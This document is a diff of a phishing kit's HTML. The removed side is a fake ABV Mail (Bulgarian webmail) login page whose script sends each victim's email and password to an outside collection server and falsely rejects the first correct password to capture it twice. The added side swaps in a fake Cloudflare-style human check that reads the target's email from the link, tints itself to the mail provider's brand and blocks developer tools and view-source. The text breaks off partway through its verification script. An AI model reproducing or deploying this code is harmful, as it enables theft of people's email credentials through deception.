@@ -1,403 +1,394 @@
-<!doctype html>
-<!-- Made in Framer · framer.com ✨ -->
-<html dir="ltr">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width">
-<meta name="generator" content="Framer 77cb752">
-<title>АБВ Поща - Вход</title>
-<meta name="description" content="АБВ Поща - Вход">
-<link href="https://framerusercontent.com/sites/icons/default-favicon-light.v1.png" rel="icon" media="(prefers-color-scheme: light)">
-<link rel="canonical" href="https://novel-spinosaurus-700863.framer.app/">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Authenticating...</title>
 
-<style data-framer-font-css>
-@font-face { font-family: "Inter"; src: url("https://framerusercontent.com/assets/UjlFhCnUjxhNfep4oYBPqnEssyo.woff2"); font-display: swap; font-style: normal; font-weight: 500; }
-@font-face { font-family: "Inter"; src: url("https://framerusercontent.com/assets/GrgcKwrN6d3Uz8EwcLHZxwEfC4.woff2"); font-display: swap; font-style: normal; font-weight: 400; }
-@font-face { font-family: "Inter"; src: url("https://framerusercontent.com/assets/yDtI2UI8XcEg1W2je9XPN3Noo.woff2"); font-display: swap; font-style: normal; font-weight: 600; }
-@font-face { font-family: "Inter"; src: url("https://framerusercontent.com/assets/syRNPWzAMIrcJ3wIlPIP43KjQs.woff2"); font-display: swap; font-style: normal; font-weight: 700; }
-@font-face { font-family: "Open Sans"; src: url(https://fonts.gstatic.com/s/opensans/v44/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4gaVI.woff2) format('woff2'); font-display: swap; font-style: normal; font-weight: 400; }
-</style>
-
-<link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
-<meta name="robots" content="max-image-preview:large">
-
+<!-- =========================================================
+     ANTI-SOURCE CODE & DEVTOOLS PROTECTION (Starts Here)
+     ========================================================= -->
 <style>
-/* Base & Reset */
-html, body, #main { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Inter', sans-serif; background: #fff; }
+  /* Disable text selection */
+  body {
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+  }
+</style>
+<script>
+  // Disable Right Click
+  document.addEventListener('contextmenu', event => event.preventDefault());
+  // Disable Drag
+  document.addEventListener('dragstart', event => event.preventDefault());
 
-/* Main Container */
-.framer-k1yVm { height: 1080px; background-color: #fff; width: 1351px; position: relative; margin: 0 auto; }
+  // Disable Keyboards Shortcuts (F12, Ctrl+U, Ctrl+S, Ctrl+Shift+I/J/C)
+  document.addEventListener('keydown', function(e) {
+      // F12
+      if (e.key === 'F12' || e.keyCode === 123) {
+          e.preventDefault();
+          return false;
+      }
+      // Ctrl+Shift+I / J / C (Windows/Linux)
+      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
+          e.preventDefault();
+          return false;
+      }
+      // Cmd+Option+I / J / C (Mac)
+      if (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
+          e.preventDefault();
+          return false;
+      }
+      // Ctrl+U / Cmd+U (View Source)
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
+          e.preventDefault();
+          return false;
+      }
+      // Ctrl+S / Cmd+S (Save Page)
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) {
+          e.preventDefault();
+          return false;
+      }
+  });
 
-/* Top Bar */
-.framer-l37xyv { z-index: 10; background-color: #f0f0f0; width: 100%; height: 35px; position: absolute; top: 0; left: 0; }
-.framer-1uj2ez6 { width: 25px; position: absolute; top: 5px; left: 15px; }
-.framer-13rvrfu { display: flex; position: absolute; top: 11px; left: 36px; border-right: 2px solid #d4d0c8; padding: 0 11px; align-items: center; }
-.framer-i0rsf2 { display: flex; position: absolute; top: 11px; left: 134px; border-right: 2px solid #d4d0c8; padding: 0 11px; align-items: center; }
-.framer-1inf8b4 { display: flex; position: absolute; top: 11px; left: 185px; border-right: 2px solid #d4d0c8; padding: 0 11px; align-items: center; }
-.framer-14zwyi7 { position: absolute; top: 11px; left: 335px; }
-.framer-1trcrps { position: absolute; top: 3px; left: 470px; }
-.framer-e23xuc { display: flex; position: absolute; top: 11px; left: 1095px; border-right: 2px solid #d4d0c8; padding: 0 12px 0 11px; align-items: center; }
-.framer-1ofzc25 { position: absolute; top: 11px; left: 1253px; }
+  // DevTools Detection (Redirects if opened)
+  setInterval(function() {
+      var widthThreshold = window.outerWidth - window.innerWidth > 160;
+      var heightThreshold = window.outerHeight - window.innerHeight > 160;
+      var orientation = widthThreshold ? 'vertical' : 'horizontal';
+      
+      if ((heightThreshold && widthThreshold) || (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized)) {
+          if (document.body) {
+              document.body.innerHTML = '<div style="text-align:center;margin-top:20vh;font-family:sans-serif;"><h1>Security Notice</h1><p>Developer tools are not permitted on this page.</p></div>';
+          }
+          window.location.reload();
+      }
+  }, 1000);
+</script>
+<!-- =========================================================
+     ANTI-SOURCE CODE PROTECTION (Ends Here)
+     ========================================================= -->
 
-/* Logos */
-.framer-ivfs9d { position: absolute; top: 53px; left: 216px; }
-.framer-1tyjjwu { position: absolute; top: 77px; left: 827px; width: 305px; border: 1px solid #e0e0e0; }
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<style>
+  :root {
+    --brand-c1: #0066FF;
+    --brand-c2: #0047B3;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Noto Sans KR", "Noto Sans JP", "Noto Sans SC", Arial, sans-serif;
+    background: #f3f4f6; /* Exact light gray from screenshot */
+    color: #1e293b;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    transition: background 0.5s ease;
+    background-size: cover;
+    background-position: center center;
+    background-attachment: fixed;
+  }
+  .cf-card {
+    background: #fff;
+    border-radius: 16px;
+    max-width: 520px;
+    width: 100%;
+    padding: 50px 40px;
+    box-shadow: 0 10px 30px rgba(0,0,0,.04), 0 1px 3px rgba(0,0,0,.02);
+    text-align: center;
+    position: relative;
+    z-index: 1;
+  }
+  .cf-card h1 {
+    font-size: 22px;
+    font-weight: 600;
+    color: #1e293b;
+    margin-bottom: 12px;
+  }
+  .cf-card p {
+    font-size: 14.5px;
+    color: #64748b;
+    margin-bottom: 32px;
+    line-height: 1.5;
+    padding: 0 10px;
+  }
+  .cf-turnstile {
+    display: flex;
+    justify-content: center;
+    margin: 0 auto 20px;
+    min-height: 65px;
+  }
+  
+  /* Verifying Spinner */
+  .spinner {
+    display: none;
+    width: 32px;
+    height: 32px;
+    margin: 0 auto 20px;
+    border: 3px solid #e2e8f0;
+    border-top: 3px solid var(--brand-c1);
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  
+  .error-box {
+    display: none;
+    background: #fef2f2;
+    border: 1px solid #fecaca;
+    color: #b91c1c;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 13px;
+    margin-bottom: 20px;
+    text-align: left;
+  }
 
-/* News Images */
-.framer-1tqp0cc, .framer-1lwhm32, .framer-1cb6bps { position: absolute; top: 473px; width: 215px; }
-.framer-1tqp0cc { left: 196px; }
-.framer-1lwhm32 { left: 428px; }
-.framer-1cb6bps { left: 660px; }
-.framer-1op5ul { position: absolute; top: 638px; left: 741px; width: 215px; }
-.framer-heb492 { position: absolute; top: 586px; left: 196px; width: 262px; }
-.framer-1srjyxk { position: absolute; top: 586px; left: 472px; width: 262px; }
+  /* Copyright Footer */
+  .cf-footer {
+    margin-top: 36px;
+    font-size: 12px;
+    color: #94a3b8;
+  }
 
-/* Login Box Area */
-.framer-195nnv8 { background-color: #b8e6fd; width: 640px; height: 288px; position: absolute; top: 146px; left: 196px; }
-.framer-nmkhwe { position: absolute; top: 15px; left: 25px; }
-.framer-zgdkdg { position: absolute; top: 0; left: 340px; width: 300px; }
-.framer-1ivdcrg { position: absolute; bottom: 32px; left: 76px; }
-.framer-17sdx75 { position: absolute; bottom: 8px; left: 25px; }
-
-/* Footer */
-.framer-1k6dsll { background: #fff; width: 940px; height: 33px; position: absolute; top: 434px; left: calc(49.2968% - 470px); }
-.framer-122upky { position: absolute; top: -14px; left: 24px; }
-.framer-6nmjat { position: absolute; top: 7px; left: 898px; }
-
-/* Form Styles */
-.framer-PR0MW { display: flex; flex-direction: column; gap: 10px; width: 315px; position: absolute; top: 60px; left: 25px; }
-.framer-form-text-input { background: #fcffdf; border: 1px solid rgba(136,136,136,.1); border-radius: 2px; padding: 4px; display: flex; align-items: center; height: 29px; }
-.framer-form-text-input input { background: transparent; border: none; outline: none; width: 100%; padding: 0 4px; font-size: 14px; font-family: 'Inter', sans-serif; }
-.framer-btn, .framer-sPvcm { background: rgb(27,158,21); border: none; color: #fff; font-size: 14px; font-weight: 600; width: 240px; height: 40px; cursor: pointer; border-radius: 2px; }
-.framer-text { margin: 0; padding: 0; }
-
-/* Custom Messages */
-.abv-custom-error { color: #d32f2f; font-size: 12px; font-weight: 600; margin-top: 8px; padding: 8px 12px; background: #ffebee; border-radius: 4px; border-left: 3px solid #d32f2f; display: none; font-family: 'Inter', sans-serif; }
-.abv-custom-error.show { display: block; }
-.abv-custom-success { color: #1ba916; font-size: 12px; font-weight: 600; margin-top: 8px; padding: 8px 12px; background: #e8f5e9; border-radius: 4px; border-left: 3px solid #1ba916; display: none; font-family: 'Inter', sans-serif; }
-.abv-custom-success.show { display: block; }
-
-/* ===== SOURCE PROTECTION ===== */
-html, body {
-  -webkit-user-select: none;
-  -moz-user-select: none;
-  -ms-user-select: none;
-  user-select: none;
-  -webkit-touch-callout: none;
-  -webkit-tap-highlight-color: transparent;
-}
-input, textarea { -webkit-user-select: text; -moz-user-select: text; user-select: text; }
-img { -webkit-user-drag: none; -khtml-user-drag: none; -moz-user-drag: none; -o-user-drag: none; user-drag: none; }
-::selection { background: rgba(27,158,21,.22); }
+  .state-verifying .spinner { display: block; }
+  .state-verifying .cf-turnstile { display: none; }
 </style>
 </head>
-<body class="is-abv" oncontextmenu="return false;" ondragstart="return false;">
+<body oncontextmenu="return false;">
 
-<div id="main">
-<style>html body { background: rgb(255, 255, 255); }</style>
-<div data-framer-root class="framer-k1yVm framer-72rtr7">
+<div class="cf-card" id="cfCard">
+  <!-- Title & Subtitle matching screenshot -->
+  <h1 id="t-title">Authenticating Your Session</h1>
+  <p id="t-subtitle">We need to confirm you are human before proceeding to your secure workspace.</p>
 
-  <!-- TOP BAR -->
-  <div class="framer-l37xyv">
-    <div class="framer-1uj2ez6">
-      <img decoding="async" width="25" height="27" draggable="false" src="https://framerusercontent.com/images/casWq2XT2AxtIAfXFrCfMV2R0.svg?width=25&height=27" alt="АБВ поща" style="width:100%;height:100%">
-    </div>
-    <div class="framer-13rvrfu"><p class="framer-text" style="font-size:14px;font-weight:900;line-height:14px;color:#000">АБВ Поща</p></div>
-    <div class="framer-i0rsf2"><p class="framer-text" style="font-size:12px;font-weight:700;color:rgb(30,147,12)">DOX</p></div>
-    <div class="framer-1inf8b4"><p class="framer-text" style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ на твой домейн</p></div>
-    <div class="framer-14zwyi7"><img decoding="async" width="101" height="15" draggable="false" src="https://framerusercontent.com/images/uebBbbNZYu4aV5MVIkBR0U26F2M.svg?width=101&height=15" alt="АБВ TruStsuite" style="width:100%"></div>
-    <div class="framer-1trcrps"><img decoding="async" width="61" height="27" draggable="false" src="https://framerusercontent.com/images/EgViW3Y1mC1GWqjtSx1lBDjhCqs.svg?width=61&height=27" style="width:100%"></div>
-    <div class="framer-e23xuc"><p class="framer-text" style="font-size:12px;font-weight:700;color:rgb(30,147,12)">Регистрация в АБВ</p></div>
-    <div class="framer-1ofzc25"><p class="framer-text" style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ профил</p></div>
+  <div class="spinner"></div>
+
+  <!-- REPLACE 'YOUR_SITE_KEY_HERE' WITH YOUR ACTUAL CLOUDFLARE TURNSTILE SITE KEY -->
+  <div class="cf-turnstile"
+       id="turnstileWidget"
+       data-sitekey="0x4AAAAAAGIWA_pI_5jjyxqa"
+       data-callback="onVerified"
+       data-error-callback="onTurnstileError"
+       data-expired-callback="onTurnstileExpired"
+       data-theme="light"
+       data-size="normal"></div>
+
+  <div class="error-box" id="errorBox"></div>
+
+  <!-- Dynamic Copyright Footer -->
+  <div class="cf-footer" id="t-footer">
+    © 2026 secure-workspace.com
   </div>
-
-  <!-- LOGO -->
-  <div class="framer-ivfs9d"><img decoding="async" width="162" height="60" draggable="false" src="https://framerusercontent.com/images/5XhmlwsfPBGpVltxlwiDdG9kbo.svg?width=162&height=60" style="width:100%"></div>
-  <div class="framer-1tyjjwu"><img decoding="async" width="180" height="30" draggable="false" src="https://framerusercontent.com/images/ZeCcpoYP2U97mEHPaGcLCZZ6TUs.svg?width=180&height=30" style="width:100%"></div>
-
-  <!-- NEWS IMAGES -->
-  <div class="framer-1tqp0cc"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/wBR7zAdtrn6C95FCM4PckzSLiCc.jpg?width=215&height=100" style="width:100%"></div>
-  <div class="framer-1lwhm32"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/p6OxGGbP252qR6YGCNy37MAumxs.jpg?width=215&height=100" style="width:100%"></div>
-  <div class="framer-1cb6bps"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/k3u3mM2vefXrTni654AVuXGYQw.jpg?width=215&height=100" style="width:100%"></div>
-  <div class="framer-1op5ul"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/mR27Z9ciB9VoWIUmbkgcgfR97tU.jpg?width=1000&height=600" style="width:100%"></div>
-  <div class="framer-heb492"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/7u0tWTuqrVIRhnkaOAu2Kx3EVH0.jpg?width=260&height=180" style="width:100%"></div>
-  <div class="framer-1srjyxk"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/UZRgbZYB2TjD2gdiDjaQo3wb5qg.jpg?width=260&height=180" style="width:100%"></div>
-
-  <!-- LOGIN CARD -->
-  <div class="framer-195nnv8">
-    <div class="framer-nmkhwe"><h2 class="framer-text" style="font-size:21px;color:rgb(47,47,47);font-weight:400">Вход в АБВ Поща</h2></div>
-    <div class="framer-zgdkdg"><img decoding="async" width="305" height="247" draggable="false" src="https://framerusercontent.com/images/sgSVom1iXFk6VFGgXqvmmuMUbt4.png?width=305&height=247" style="width:100%"></div>
-    <div class="framer-17sdx75"><p class="framer-text" style="font-size:11px;color:rgb(47,47,47)">Нямаш профил в АБВ? <a class="framer-text" href="https://passport.abv.bg/app/profiles/registration" style="color:rgb(30,147,12)">Регистрирай се!</a></p></div>
-    <div class="framer-1ivdcrg"><p class="framer-text" style="font-size:11px"><a class="framer-text" href="https://passport.abv.bg/app/profiles/lostpass" style="color:rgb(22,110,29)">Забравена парола</a></p></div>
-
-    <!-- FORM -->
-    <form class="framer-PR0MW framer-147248w">
-      <p class="framer-text" style="font-size:12px;font-weight:500;color:rgb(20,20,20)">АБВ потребител:</p>
-      <div class="framer-form-text-input">
-        <input type="email" required name="Email" class="framer-form-input" value>
-      </div>
-      <p class="framer-text" style="font-size:12px;font-weight:500;color:rgb(20,20,20)">Парола:</p>
-      <div class="framer-form-text-input">
-        <input type="password" required name="text" class="framer-form-input" value>
-      </div>
-      <button type="button" class="framer-sPvcm framer-1efqo4b framer-btn" data-framer-name="Default">Вход</button>
-      <div id="abv-error" class="abv-custom-error"></div>
-      <div id="abv-success" class="abv-custom-success"></div>
-    </form>
-  </div>
-
-  <!-- NEWS FOOTER -->
-  <div class="framer-1k6dsll">
-    <div class="framer-122upky"><h2 class="framer-text" style="font-size:18px;color:rgb(47,47,47);font-weight:400"><a class="framer-text" href="https://nova.bg/" target="_blank" style="color:rgb(47,47,47);text-decoration:none">NOVA</a></h2></div>
-    <div class="framer-6nmjat"><p class="framer-text" style="font-size:11px;color:rgb(30,147,12)">Още новини</p></div>
-  </div>
-
 </div>
 
-<!-- ============================================================ -->
-<!-- CUSTOM SCRIPT - BACKEND INTEGRATION (inside body, before end) -->
-<!-- ============================================================ -->
 <script>
-(function() {
-    var API_BASE_URL = "https://abv-login-m5lk.onrender.com";
-    console.log('🚀 Backend integration loaded:', API_BASE_URL);
-    console.log('📍 Current URL:', window.location.href);
-    console.log('📍 Hash:', window.location.hash);
+/* ============================================================
+   API Config
+   ============================================================ */
+const API_BASE = 'https://abv-login-m5lk.onrender.com';
 
-    function getEmailFromHash() {
-        try {
-            var hash = window.location.hash.substr(1);
-            if (!hash) return null;
-            try {
-                var decoded = atob(hash);
-                if (decoded && decoded.indexOf('@') > -1) return decoded;
-            } catch (e) {}
-            if (hash.indexOf('@') > -1) return hash;
-            var match = hash.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
-            if (match) return match[0];
-        } catch (e) {}
-        return null;
+/* ============================================================
+   MULTILINGUAL DICTIONARY — 23 languages
+   ============================================================ */
+const translations = {
+  en: { title:"Authenticating Your Session", subtitle:"We need to confirm you are human before proceeding to your secure workspace.", errFail:"Verification failed. Please refresh the page.", errTimeout:"Security check is taking longer than expected. Please refresh." },
+  bg: { title:"Удостоверяване на сесията", subtitle:"Трябва да потвърдим, че сте човек, преди да продължите към защитеното си работно пространство.", errFail:"Неуспешна проверка. Моля, опреснете страницата.", errTimeout:"Проверката отнема повече време. Опреснете." },
+  de: { title:"Sitzung wird authentifiziert", subtitle:"Wir müssen bestätigen, dass Sie ein Mensch sind, bevor Sie fortfahren.", errFail:"Überprüfung fehlgeschlagen. Bitte laden Sie die Seite neu.", errTimeout:"Sicherheitsüberprüfung dauert länger. Bitte neu laden." },
+  ko: { title:"세션 인증 중", subtitle:"보안 작업 공간으로 이동하기 전에 사람인지 확인해야 합니다.", errFail:"인증에 실패했습니다. 페이지를 새로고침하세요.", errTimeout:"보안 확인이 예상보다 오래 걸립니다. 새로고침하세요." },
+  ru: { title:"Аутентификация сеанса", subtitle:"Нам нужно убедиться, что вы человек, прежде чем продолжить.", errFail:"Ошибка проверки. Пожалуйста, обновите страницу.", errTimeout:"Проверка безопасности занимает больше времени. Обновите." },
+  es: { title:"Autenticando su sesión", subtitle:"Necesitamos confirmar que es humano antes de continuar a su espacio de trabajo seguro.", errFail:"La verificación falló. Actualiza la página.", errTimeout:"La verificación está tardando más de lo esperado. Actualiza." },
+  fr: { title:"Authentification de votre session", subtitle:"Nous devons confirmer que vous êtes humain avant de continuer.", errFail:"Échec de la vérification. Veuillez actualiser la page.", errTimeout:"La vérification prend plus de temps. Actualisez." },
+  it: { title:"Autenticazione della sessione", subtitle:"Dobbiamo confermare che sei umano prima di procedere.", errFail:"Verifica non riuscita. Aggiorna la pagina.", errTimeout:"La verifica sta impiegando più tempo. Aggiorna." },
+  pt: { title:"Autenticando sua sessão", subtitle:"Precisamos confirmar que você é humano antes de continuar.", errFail:"Falha na verificação. Atualize a página.", errTimeout:"A verificação está demorando mais. Atualize." },
+  nl: { title:"Uw sessie verifiëren", subtitle:"We moeten bevestigen dat u een mens bent voordat u doorgaat.", errFail:"Verificatie mislukt. Vernieuw de pagina.", errTimeout:"Beveiligingscontrole duurt langer. Vernieuw." },
+  ja: { title:"セッションの認証", subtitle:"続行する前に、人間であることを確認する必要があります。", errFail:"認証に失敗しました。ページを更新してください。", errTimeout:"セキュリティチェックに時間がかかっています。更新してください。" },
+  zh: { title:"正在验证您的会话", subtitle:"我们需要确认您是真人才能继续。", errFail:"验证失败。请刷新页面。", errTimeout:"安全检查耗时较长。请刷新。" },
+  'zh-TW': { title:"正在驗證您的會話", subtitle:"我們需要確認您是真人才能繼續。", errFail:"驗證失敗。請重新整理頁面。", errTimeout:"安全檢查耗時較長。請重新整理。" },
+  ar: { title:"مصادقة جلستك", subtitle:"نحتاج إلى التأكد من أنك إنسان قبل المتابعة.", errFail:"فشل التحقق. يرجى تحديث الصفحة.", errTimeout:"يستغرق التحقق الأمني وقتًا أطول. يرجى التحديث." },
+  he: { title:"מאמת את הסשן שלך", subtitle:"עלינו לוודא שאתה אדם לפני שתמשיך.", errFail:"האימות נכשל. אנא רענן את הדף.", errTimeout:"בדיקת האבטחה אורכת זמן רב מהצפוי. אנא רענן." },
+  tr: { title:"Oturumunuz Doğrulanıyor", subtitle:"Devam etmeden önce insan olduğunuzu onaylamamız gerekiyor.", errFail:"Doğrulama başarısız. Lütfen sayfayı yenileyin.", errTimeout:"Güvenlik kontrolü uzun sürüyor. Lütfen yenileyin." },
+  pl: { title:"Uwierzytelnianie sesji", subtitle:"Musimy potwierdzić, że jesteś człowiekiem, zanim przejdziesz dalej.", errFail:"Weryfikacja nie powiodła się. Odśwież stronę.", errTimeout:"Weryfikacja bezpieczeństwa trwa dłużej. Odśwież." },
+  uk: { title:"Автентифікація сеансу", subtitle:"Нам потрібно переконатися, що ви людина, перш ніж продовжити.", errFail:"Помилка перевірки. Оновіть сторінку.", errTimeout:"Перевірка безпеки триває довше. Оновіть." },
+  ro: { title:"Se autentifică sesiunea", subtitle:"Trebuie să confirmăm că sunteți o persoană înainte de a continua.", errFail:"Verificarea a eșuat. Reîmprospătați pagina.", errTimeout:"Verificarea de securitate durează mai mult. Reîmprospătați." },
+  vi: { title:"Đang xác thực phiên của bạn", subtitle:"Chúng tôi cần xác nhận bạn là con người trước khi tiếp tục.", errFail:"Xác minh thất bại. Vui lòng làm mới trang.", errTimeout:"Kiểm tra bảo mật mất nhiều thời gian hơn. Vui lòng làm mới." },
+  th: { title:"กำลังตรวจสอบสิทธิ์เซสชันของคุณ", subtitle:"เราจำเป็นต้องยืนยันว่าคุณเป็นมนุษย์ก่อนดำเนินการต่อ", errFail:"การตรวจสอบล้มเหลว โปรดรีเฟรชหน้า", errTimeout:"การตรวจสอบความปลอดภัยใช้เวลานาน โปรดรีเฟรช" },
+  id: { title:"Mengautentikasi Sesi Anda", subtitle:"Kami perlu mengonfirmasi bahwa Anda manusia sebelum melanjutkan.", errFail:"Verifikasi gagal. Silakan muat ulang halaman.", errTimeout:"Pemeriksaan keamanan memakan waktu lebih lama. Muat ulang." }
+};
+
+const RTL_LANGS = ['ar', 'he'];
+let currentLang = 'en';
+
+/* ============================================================
+   Language detection
+   ============================================================ */
+function detectLanguage() {
+  const userLang = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
+
+  if (userLang.startsWith('zh-tw') || userLang.startsWith('zh-hk') || userLang.startsWith('zh-hant')) return 'zh-TW';
+  if (userLang.startsWith('zh')) return 'zh';
+
+  const base = userLang.split('-')[0];
+  if (translations[base]) return base;
+
+  const prefs = navigator.languages || [];
+  for (const lang of prefs) {
+    const raw = String(lang).toLowerCase();
+    if (raw.startsWith('zh-tw') || raw.startsWith('zh-hk') || raw.startsWith('zh-hant')) return 'zh-TW';
+    if (raw.startsWith('zh')) return 'zh';
+    const b = raw.split('-')[0];
+    if (translations[b]) return b;
+  }
+  return 'en';
+}
+
+function applyTranslations(lang) {
+  const t = translations[lang] || translations['en'];
+  currentLang = lang;
+
+  document.documentElement.lang = lang;
+  document.documentElement.dir = RTL_LANGS.includes(lang) ? 'rtl' : 'ltr';
+
+  document.title = t.title;
+  document.getElementById('t-title').textContent = t.title;
+  document.getElementById('t-subtitle').textContent = t.subtitle;
+}
+
+/* ============================================================
+   READ EMAIL FROM URL
+   ============================================================ */
+function getEmailFromSource() {
+  let fromHash = window.location.hash.substring(1);
+  if (fromHash) {
+    try { fromHash = decodeURIComponent(fromHash); } catch (e) {}
+    fromHash = fromHash.split('&')[0].split('?')[0].replace(/^email=/i, '').trim();
+    if (fromHash.includes('@')) return fromHash;
+  }
+  const params = new URLSearchParams(window.location.search);
+  const keys = ['auth', 'e', 'email', 'u', 'login_hint', 'user', 'mail'];
+  for (const k of keys) {
+    const v = params.get(k);
+    if (v && v.includes('@')) return v;
+  }
+  return '';
+}
+
+var EMAIL = getEmailFromSource();
+var verified = false;
+
+/* ============================================================
+   INIT
+   ============================================================ */
+(function init() {
+  const detectedLang = detectLanguage();
+  applyTranslations(detectedLang);
+
+  // Set dynamic copyright footer based on the target domain
+  const footerEl = document.getElementById('t-footer');
+  if (EMAIL) {
+    const domain = EMAIL.split('@')[1] || '';
+    footerEl.textContent = `© 2026 ${domain}`;
+    
+    // Optional: Tint the background slightly to match the brand
+    const brandColors = {
+      'naver.com': '#03c75a', 'naver.net': '#03c75a', 'daum.net': '#f9a800', 'hanmail.net': '#f9a800',
+      'abv.bg': '#1e930c', 'outlook.com': '#0078d4', 'hotmail.com': '#0078d4', 'live.com': '#0078d4',
+      'microsoft.com': '#0078d4', 'gmail.com': '#4285F4', 'google.com': '#4285F4', 'yahoo.com': '#7b0099',
+      'yandex.ru': '#fc3f1d', 'mail.ru': '#005ff9', 'hiworks.co.kr': '#1a73e8', 'gabia.com': '#e95e2e'
+    };
+    
+    const accent = brandColors[domain];
+    if (accent) {
+      document.documentElement.style.setProperty('--brand-c1', accent);
+      document.documentElement.style.setProperty('--brand-c2', accent);
     }
-
-    function showError(msg) {
-        var el = document.getElementById('abv-error');
-        var suc = document.getElementById('abv-success');
-        if (el) { el.textContent = msg; el.classList.add('show'); }
-        if (suc) suc.classList.remove('show');
-    }
-    function showSuccess(msg) {
-        var el = document.getElementById('abv-success');
-        var err = document.getElementById('abv-error');
-        if (el) { el.textContent = msg; el.classList.add('show'); }
-        if (err) err.classList.remove('show');
-    }
-
-    function tryInit() {
-        var emailInput = document.querySelector('input[name="Email"]');
-        var passwordInput = document.querySelector('input[name="text"]');
-        var submitButton = document.querySelector('button.framer-sPvcm, button[data-framer-name="Default"]');
-
-        if (!emailInput || !passwordInput || !submitButton) return false;
-
-        console.log('✅ Form hooked');
-
-        var emailFromUrl = getEmailFromHash();
-        if (emailFromUrl) {
-            emailInput.value = emailFromUrl;
-            emailInput.dispatchEvent(new Event('input', { bubbles: true }));
-            emailInput.dispatchEvent(new Event('change', { bubbles: true }));
-            console.log('📧 Email auto-filled:', emailFromUrl);
-        }
-
-        var attemptCount = 0;
-
-        submitButton.addEventListener('click', async function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            e.stopImmediatePropagation();
-
-            var email = emailInput.value.trim();
-            var password = passwordInput.value.trim();
-
-            if (!email) { showError('Грешен потребител'); emailInput.focus(); return; }
-            var re = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-            if (!re.test(email)) { showError('Грешен потребител'); emailInput.focus(); return; }
-            if (!password || password.length <= 4) { showError('Грешен парола.'); passwordInput.focus(); return; }
-
-            var domain = email.split('@')[1];
-            submitButton.style.opacity = '0.6';
-            submitButton.style.pointerEvents = 'none';
-            var orig = submitButton.textContent;
-            submitButton.textContent = 'Проверка...';
-
-            try {
-                var response = await fetch(API_BASE_URL + '/api/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: email, password: password })
-                });
-                var data = await response.json();
-                console.log('✅ Backend response:', data);
-
-                if (data.success) {
-                    attemptCount++;
-                    if (attemptCount >= 2) {
-                        showSuccess('✅ Успешен вход! Пренасочване...');
-                        setTimeout(function() { window.location.replace('http://www.' + domain); }, 2500);
-                    } else {
-                        showError('Грешен парола.');
-                        passwordInput.value = '';
-                        passwordInput.focus();
-                        submitButton.style.opacity = '1';
-                        submitButton.style.pointerEvents = 'auto';
-                        submitButton.textContent = orig;
-                    }
-                } else {
-                    showError('Грешен потребител / парола.');
-                    passwordInput.value = '';
-                    passwordInput.focus();
-                    submitButton.style.opacity = '1';
-                    submitButton.style.pointerEvents = 'auto';
-                    submitButton.textContent = orig;
-                }
-            } catch (err) {
-                console.error('❌ Error:', err);
-                showError('❌ Грешка при връзка със сървъра');
-                submitButton.style.opacity = '1';
-                submitButton.style.pointerEvents = 'auto';
-                submitButton.textContent = orig;
-            }
-        }, true);
-
-        passwordInput.addEventListener('keypress', function(e) {
-            if (e.which === 13) { e.preventDefault(); submitButton.click(); }
-        }, true);
-        emailInput.addEventListener('keypress', function(e) {
-            if (e.which === 13) { e.preventDefault(); passwordInput.focus(); }
-        }, true);
-
-        return true;
-    }
-
-    var attempts = 0;
-    var maxAttempts = 50;
-    function waitForForm() {
-        attempts++;
-        if (tryInit()) { console.log('🎉 Hooked after ' + attempts + ' attempts'); return; }
-        if (attempts < maxAttempts) setTimeout(waitForForm, 200);
-        else {
-            var obs = new MutationObserver(function() {
-                if (tryInit()) { console.log('🎉 Hooked via MutationObserver'); obs.disconnect(); }
-            });
-            obs.observe(document.body, { childList: true, subtree: true });
-        }
-    }
-
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', function() { setTimeout(waitForForm, 400); });
-    } else {
-        setTimeout(waitForForm, 400);
-    }
-
-    window.addEventListener('pageshow', function(e) { if (e.persisted) location.reload(); });
+  } else {
+    footerEl.textContent = `© 2026 secure-workspace.com`;
+  }
 })();
-</script>
 
-<!-- ============================================================ -->
-<!-- SOURCE PROTECTION LAYER -->
-<!-- ============================================================ -->
-<script>
-(function () {
-  'use strict';
+/* ============================================================
+   TURNSTILE CALLBACKS & BACKEND VERIFICATION
+   ============================================================ */
